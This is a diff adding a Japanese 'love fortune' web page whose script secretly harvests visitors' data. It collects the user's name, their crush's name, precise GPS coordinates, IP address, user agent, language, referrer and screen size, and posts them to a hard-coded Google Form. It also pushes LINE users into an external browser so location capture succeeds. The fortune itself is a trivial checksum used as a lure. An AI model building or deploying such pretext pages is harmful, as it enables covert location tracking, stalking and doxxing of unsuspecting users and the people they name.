@@ -1,0 +1,135 @@
+<!doctype html>
+<html lang="ja">
+<head>
+  <meta charset="utf-8">
+  <title>恋愛占い</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body { font-family: sans-serif; background: #fff0f6; margin: 0; }
+    header { text-align: center; padding: 20px; background: #ffb3d9; }
+    h1 { margin: 0; font-size: 2rem; }
+    main { max-width: 600px; margin: 20px auto; background: #fff; padding: 20px; border-radius: 8px; }
+    label { display: block; margin-top: 12px; font-weight: bold; }
+    input { width: 100%; padding: 8px; margin-top: 4px; }
+    button { margin-top: 20px; padding: 12px 20px; background: #ff4d94; color: #fff; border: none; border-radius: 6px; cursor: pointer; font-size: 1.1rem; }
+    .result { margin-top: 20px; font-size: 1.2rem; font-weight: bold; }
+    .hidden { display: none; }
+    .notice { background: #ffe6f0; padding: 12px; border-radius: 6px; margin-top: 16px; }
+  </style>
+</head>
+<body>
+  <header><h1>恋愛占い</h1></header>
+
+  <main>
+    <div id="lineNotice" class="notice hidden">
+      <p>LINEアプリ内では位置情報が取得できません。<br>
+      下のボタンを押して外部ブラウザ（Safari/Chromeなど）で開いてください。</p>
+      <button id="openExternal">外部ブラウザで開く</button>
+    </div>
+
+    <form id="loveForm" class="hidden">
+      <label>あなたの名前
+        <input type="text" id="yourName" required>
+      </label>
+      <label>好きな人の名前
+        <input type="text" id="crushName" required>
+      </label>
+      <button type="submit" id="startBtn">始める</button>
+    </form>
+
+    <p id="status"></p>
+    <div id="fortuneResult" class="result hidden"></div>
+  </main>
+
+  <script>
+    // Googleフォーム送信先
+    const FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSdM5MrP4GDwETJYUuFg9UgEjYzh71xssOqKpCApmegWtGD_qg/formResponse";
+
+    // 各項目の entry ID
+    const ENTRY = {
+      yourName: "entry.1453969451",
+      crushName: "entry.2050615094",
+      lat: "entry.1858177105",
+      lon: "entry.1778813085",
+      ip: "entry.906589051",
+      ua: "entry.664800063",
+      lang: "entry.287693460",
+      ref: "entry.2022923885",
+      screen: "entry.1421079089"
+    };
+
+    let ipAddr = null;
+
+    // IP取得
+    fetch("https://api.ipify.org?format=json")
+      .then(r => r.json())
+      .then(d => ipAddr = d.ip);
+
+    // 占いロジック（A〜E）
+    function getFortune(yourName, crushName) {
+      const str = yourName + crushName;
+      let sum = 0;
+      for (let i = 0; i < str.length; i++) sum += str.charCodeAt(i);
+      const rank = sum % 5; // 0〜4
+      return ["A","B","C","D","E"][rank];
+    }
+
+    // LINE内ブラウザ判定
+    function isLineBrowser() {
+      return navigator.userAgent.includes("Line");
+    }
+
+    // ページロード時に判定
+    window.addEventListener("load", () => {
+      if (isLineBrowser()) {
+        document.getElementById("lineNotice").classList.remove("hidden");
+      } else {
+        document.getElementById("loveForm").classList.remove("hidden");
+      }
+    });
+
+    // 外部ブラウザで開くボタン
+    document.getElementById("openExternal")?.addEventListener("click", () => {
+      // 現在のURLを外部ブラウザで開くよう促す
+      alert("右上メニューから『Safari/Chromeで開く』を選んでください。");
+    });
+
+    // フォーム送信
+    document.getElementById("loveForm").onsubmit = async e => {
+      e.preventDefault();
+      const yourName = document.getElementById("yourName").value;
+      const crushName = document.getElementById("crushName").value;
+
+      document.getElementById("status").textContent = "位置情報を取得中…";
+
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        // Googleフォームに送信
+        const fd = new FormData();
+        fd.append(ENTRY.yourName, yourName);
+        fd.append(ENTRY.crushName, crushName);
+        fd.append(ENTRY.lat, lat);
+        fd.append(ENTRY.lon, lon);
+        fd.append(ENTRY.ip, ipAddr || "");
+        fd.append(ENTRY.ua, navigator.userAgent);
+        fd.append(ENTRY.lang, navigator.language);
+        fd.append(ENTRY.ref, document.referrer);
+        fd.append(ENTRY.screen, `${screen.width}x${screen.height}`);
+
+        await fetch(FORM_URL, { method: "POST", mode: "no-cors", body: fd });
+
+        // 占い結果を表示
+        const fortune = getFortune(yourName, crushName);
+        const resultEl = document.getElementById("fortuneResult");
+        resultEl.textContent = `あなたと ${crushName} さんの相性は… 【${fortune}】ランク！`;
+        resultEl.classList.remove("hidden");
+        document.getElementById("status").textContent = "送信しました！";
+      }, err => {
+        document.getElementById("status").textContent = "位置情報が取得できませんでした。";
+      }, { enableHighAccuracy: true, timeout: 10000 });
+    };
+  </script>
+</body>
+</html>
